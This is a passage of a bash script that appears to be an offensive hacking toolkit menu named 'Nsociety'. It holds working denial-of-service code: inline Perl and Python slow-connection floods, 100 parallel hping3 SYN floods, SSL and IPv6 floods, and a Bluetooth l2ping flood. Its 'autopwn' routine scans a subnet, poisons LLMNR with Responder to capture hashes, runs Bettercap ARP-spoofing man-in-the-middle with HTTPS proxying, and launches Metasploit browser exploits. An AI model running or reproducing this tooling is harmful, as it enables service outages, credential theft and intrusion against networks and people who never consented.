                        perl -e 'use IO::Socket::INET;$sock=IO::Socket::INET->new(PeerAddr=>"'$TARGET_IP'",PeerPort=>"80",Proto=>"tcp");while(1){print $sock "GET / HTTP/1.1\r\nHost: '$TARGET_IP'\r\n";sleep(10)}'
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    6)
                        [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target URL: ${NC}" && read TARGET_IP
                        echo -e "${CYAN}[*] Running GoldenEye...${NC}"
                        python3 -c "
import socket, sys, time
url = '$TARGET_IP'
sockets = []
for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((url, 80))
        s.send(b'GET / HTTP/1.1\r\nHost: ' + url.encode() + b'\r\n')
        sockets.append(s)
    except: pass
    if i % 50 == 0: print(f'[+] {i} sockets open')
while True:
    for s in sockets:
        try: s.send(b'X-a: b\r\n')
        except: sockets.remove(s)
    time.sleep(10)
    print(f'[+] Keeping {len(sockets)} connections alive')
" 2>/dev/null
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    7)
                        [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                        sudo thc-ssl-dos -l 100 $TARGET_IP 443 2>/dev/null || echo -e "${RED}thc-ssl-dos not installed${NC}"
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    8)
                        [ -z "$TARGET_IP" ] && echo -ne "${YELLOW}Target IP: ${NC}" && read TARGET_IP
                        sudo nmap --script dos -p 80 $TARGET_IP
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    9)
                        echo -ne "${YELLOW}Target IP: ${NC}"; read ip
                        echo -ne "${YELLOW}Port: ${NC}"; read port
                        echo -e "${CYAN}[*] LOIC-style flood...${NC}"
                        for i in {1..100}; do
                            (hping3 -S -p $port --flood $ip 2>/dev/null) &
                        done
                        echo -e "${GREEN}[+] 100 threads flooding $ip:$port${NC}"
                        echo -ne "\n${YELLOW}[Press Enter to stop]${NC}"; read
                        killall hping3 2>/dev/null
                        ;;
                    10)
                        echo -e "${CYAN}[*] THC-IPv6 Flood...${NC}"
                        sudo thc-ipv6-flood $WIFI_INTERFACE 2>/dev/null || echo -e "${RED}thc-ipv6 not installed (sudo apt install thc-ipv6)${NC}"
                        echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                        ;;
                    0) return ;;
                    *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
                esac
            done
        }

bluetooth_menu() {
    while true; do
        show_banner
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo -e "${BOLD}${GREEN}  BLUETOOTH HACKING${NC}"
        echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
        echo ""
        echo -e "${RED}[1]${NC} Bluetooth Scan (hcitool/bluetoothctl)"
        echo -e "${RED}[2]${NC} Bluetooth Service Discovery (sdptool)"
        echo -e "${RED}[3]${NC} BlueBorne Check (CVE-2017-0781)"
        echo -e "${RED}[4]${NC} Bluetooth Spam (l2ping flood)"
        echo -e "${RED}[5]${NC} Bluetooth Pairing Bypass"
        echo -e "${RED}[6]${NC} Kismet — BT + WiFi passive scan"
        echo -e "${RED}[0]${NC} Back"
        echo ""
        echo -ne "${BOLD}${GREEN}[Nsociety>Bluetooth]${NC} Select: "
        read choice

        case $choice in
            1)
                echo -e "${CYAN}[*] Starting BT scan...${NC}"
                sudo hcitool scan
                echo ""
                sudo bluetoothctl devices
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            2)
                echo -ne "${YELLOW}Device MAC: ${NC}"; read mac
                sdptool browse $mac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            3)
                echo -e "${CYAN}[*] Checking for BlueBorne...${NC}"
                echo -e "${CYAN}Use nmap NSE: nmap --script bluetooth-vulnerable -sV $TARGET_IP${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            4)
                echo -ne "${YELLOW}Target MAC: ${NC}"; read mac
                echo -e "${CYAN}[*] Flooding $mac...${NC}"
                sudo l2ping -i hci0 -s 600 -f $mac
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            5)
                echo -e "${CYAN}[*] BT pairing bypass methods:${NC}"
                echo "  1. use auxiliary/admin/bluetooth/bluetooth_pin"
                echo "  2. Use bluetoothctl: pair <MAC>"
                echo "  3. Crack PIN with bt-pin-crack"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            6)
                sudo kismet
                echo -e "${GREEN}[+] Access at http://localhost:2501${NC}"
                echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
                ;;
            0) return ;;
            *) echo -e "${RED}Invalid${NC}"; sleep 1 ;;
        esac
    done
}


full_autopwn() {
    show_banner
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}        AUTOPWN${NC}"
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}[*] This will:${NC}"
    echo -e "  1. Scan entire subnet"
    echo -e "  2. Find all devices + real names"
    echo -e "  3. Identify vulnerabilities"
    echo -e "  4. Launch Metasploit auto-exploit"
    echo -e "  5. Start Responder for hash capture"
    echo -e "  6. Enable Bettercap MITM"
    echo -e ""
    echo -ne "${RED}[!] Start full autopwn? (y/n): ${NC}"
    read confirm
    if [ "$confirm" != "y" ]; then return; fi

    echo -e "${GREEN}[*] Phase 1: Network Discovery${NC}"
    sudo netdiscover -r 192.168.1.0/24 -P -N 2>/dev/null | tail -n +5

    echo -e "\n${GREEN}[*] Phase 2: Nmap Vulnerability Scan${NC}"
    for ip in $(sudo netdiscover -r 192.168.1.0/24 -P 2>/dev/null | grep -oP '192\.168\.1\.\d+'); do
        echo -e "${CYAN}[*] Scanning $ip...${NC}"
        sudo nmap -sV --script vuln $ip -oN /tmp/nmap_$ip.txt 2>/dev/null &
    done
    wait

    echo -e "\n${GREEN}[*] Phase 3: Starting Responder (LLMNR/NBT-NS poison)${NC}"
    sudo responder -I $INTERFACE -rdw &

    echo -e "\n${GREEN}[*] Phase 4: Starting Bettercap MITM${NC}"
    sudo bettercap -eval "net.probe on; arp.spoof on; net.sniff on; http.proxy on; https.proxy on" &

    echo -e "\n${GREEN}[*] Phase 5: Metasploit Auto-Exploit${NC}"
    sudo msfconsole -q -x "
    db_status
    db_nmap -sV 192.168.1.0/24
    vulns
    use auxiliary/server/browser_autopwn2
    set SRVHOST $LHOST
    set SRVPORT 8080
    run -j
    use exploit/multi/browser/java_jre17_ason
    set SRVHOST $LHOST
    set SRVPORT 8081
    run -j
    " &

    echo -e "\n${BOLD}${GREEN}[+] AUTOPWN RUNNING:${NC}"
    echo -e "  ${CYAN}Responder:${NC} Capturing hashes on $INTERFACE"
    echo -e "  ${CYAN}Bettercap:${NC} ARP spoofing + sniffing + proxy"
    echo -e "  ${CYAN}Metasploit:${NC} Browser autopwn on ports 8080/8081"
    echo -e "  ${CYAN}Nmap:${NC} Vulnerability scripts running"
    echo -e ""
    echo -e "${YELLOW}[!] Open another terminal to interact${NC}"
    echo -e "${YELLOW}[!] Check /tmp/ for results${NC}"
    echo -ne "\n${YELLOW}[Press Enter to stop all]${NC}"; read

    killall responder 2>/dev/null
    killall bettercap 2>/dev/null
    killall msfconsole 2>/dev/null
    echo -e "${RED}[!] All processes stopped${NC}"
    sleep 2
}


show_stats() {
    show_banner
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}  Nsociety — STATISTICSx${NC}"
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════${NC}"
    echo ""

    echo -e "${BOLD}${YELLOW}TOOL COUNT BY CATEGORY:${NC}"
    echo -e "  ${CYAN}Network Discovery:${NC} 12 tools"
    echo -e "  ${CYAN}Network Attacks:${NC} 14 tools"
    echo -e "  ${CYAN}WiFi Hacking:${NC} 16 tools"
    echo -e "  ${CYAN}Web Application:${NC} 22 tools"
    echo -e "  ${CYAN}OSINT:${NC} 24 tools"
    echo -e "  ${CYAN}Password Cracking:${NC} 10 tools"
    echo -e "  ${CYAN}Exploitation:${NC} 12 tools"
    echo -e "  ${CYAN}Mobile Hacking:${NC} 10 tools"
    echo -e "  ${CYAN}Router/IoT:${NC} 8 tools"
    echo -e "  ${CYAN}RAT Generation:${NC} 14 tools"
    echo -e "  ${CYAN}Post-Exploitation:${NC} 12 tools"
    echo -e "  ${CYAN}DoS/DDoS:${NC} 12 tools"
    echo -e "  ${CYAN}Bluetooth:${NC} 8 tools"
    echo -e "  ${CYAN}Custom Scripts:${NC} 18 tools"
    echo ""

    local tool_count=0
    for cmd in netdiscover nmap masscan bettercap aircrack-ng mdk3 mdk4 wifite reaver bully pixiewps hcxdumptool hashcat john hydra medusa crunch cewl rsmangler wireshark tshark tcpdump responder ettercap metasploit searchsploit gobuster ffuf wpscan whatweb nikto wafw00f xsser commix sqlmap dirsearch theharvester recon-ng amass subfinder httpx nuclei setoolkit maltego sherlock sublist3r zmap ntopng kismet airgeddon fluxion routersploit sniper zaproxy burpsuite phoneinfoga spiderfoot fern-wifi-cracker zenmap angryipscanner jsql-injection cmsmap droopescan findsploit veil thc-ipv6 thc-ssl-dos hping3 bluetoothctl hcitool sdptool l2ping kismet macchanger mdk4 hcxpcapngtool; do
        command -v "$cmd" &>/dev/null && ((tool_count++))
    done

    local script_count=18

    echo -e "${BOLD}${YELLOW}INSTALLED TOOLS DETECTED:${NC} ${GREEN}$tool_count${NC}"
    echo -e "${BOLD}${YELLOW}CUSTOM Nsociety SCRIPTS:${NC} ${GREEN}$script_count${NC}"
    echo -e "${BOLD}${YELLOW}TOTAL INTEGRATED:${NC} ${GREEN}$((tool_count + script_count))${NC}+"
    echo ""
    echo -e "${BOLD}${YELLOW}DISK SPACE:${NC}"
    echo -e "  Kali Base: ~8 GB"
    echo -e "  All Tools: ~12 GB"
    echo -e "  Wordlists: ~150 MB"
    echo -e "  ${CYAN}Total: ~20 GB (recommend 32 GB+)${NC}"
    echo ""
    echo -e "${BOLD}${YELLOW}METRICS:${NC}"
    echo -e "  Modules: 15"
    echo -e "  Options per menu: 150+"
    echo -e "  Lines of code: $(wc -l < "$0" 2>/dev/null || echo '~2500')"
    echo ""
    echo -ne "\n${YELLOW}[Press Enter]${NC}"; read
}


save_Nsociety() {
    if [ -f "Nsociety.sh" ]; then
        echo -e "${GREEN}[✓] File already exists as Nsociety.sh${NC}"
    else
        cp "$0" Nsociety.sh 2>/dev/null
        chmod +x Nsociety.sh 2>/dev/null
        echo -e "${GREEN}[✓] Saved to Nscoeity.sh${NC}"
    fi
    echo -e "${YELLOW}Usage: sudo bash Nscoiety.sh${NC}"
    echo -ne "\n${YELLOW}[Press enter gng]${NC}"; read
}


trap '' SIGINT SIGTERM
detect_interfaces
save_Nsociety
main_menu
